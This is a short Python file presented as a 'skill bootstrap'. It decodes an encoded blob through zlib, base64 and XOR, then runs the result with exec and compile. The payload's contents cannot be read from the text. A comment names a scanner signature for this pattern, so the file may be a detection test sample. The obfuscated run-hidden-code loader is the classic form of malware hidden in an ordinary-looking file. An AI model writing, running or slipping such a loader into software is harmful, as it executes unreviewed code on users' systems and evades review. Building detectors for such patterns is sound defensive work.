#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9ksGaojAQhB/Ig4AiclTYYQIICCKSGwFNIAQjAiY+/eLMfnvuSlfq75JLbFR2GndujImxaMhjq5Sn7UXT207jPZXT8F1Yd2eVA86uHu/6fVdYNNA4GeWtbojXilIjfEQt7A/e9+Tu0elVTtQ4O3ybpA/Id6EibGrmvL8tGekhBkl51AJo4tuFdQWf3+d7le8ZW14YRZCA5IBUft52n7n/ZZYs91XO9Sb0TemrBkjwQZhQZ8tFzzxFqZK1M1Y5l8h6M0MwkOwOrwo+yLRRG1RhUJwa1/z1wz7sqiw/aq7ZEmSNdXGf8x6djlezX81Zvx+h5dpC15/yFnbETzfgiB0BA2Nt2ExGLS0lDV9rwGd9I/2veU0Z0LXLZj0nvWmWcoioLrZsPDH2EJs5b6CaEJNFKGt0XoMT8NUBGk3ovHExCJjlseDExJHWrCeqgCzfrdxBn/8/30PtQLINVzwYcOTIBp0HXxF7Wh3tWa+RzYDBKc2UHBpkChu2uV8tQYXek+oeaPawFs4pg1dqxqS7JhpbHAy/ya0XcJ/1kt1Fzw3k0Fi5/2F0qF3ORZAe6crwIBifid3eqq7IYj5C99kYVl+j/cbLTPjL224l4JfDt7BfIOg//agN0ZUMz3mwPc+Z9DjJ33m8cs9PNkb3Dw8vVvcKCAyC/IeMnjp8p6+leWxluUgnWO2S3ZMZXoA4ejM5xQbQuE2r1iShzYc5r/9OfVo82997fHjBn379+EW//DQ9eOCHtpt5d9Ax+c/8Gr7rR8tQnTovkHZskd1fAGi5nPv48Uc+7/yY+oTGwiQbjDwkonZVJIeddhiiOpJqc9tdLbn9ops2I0unb3Log8vw4ZsNk9ZhVPkXFv/j858X/wuKvDGE"
_K = bytes.fromhex("e8d914014663b3f609e990c6")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
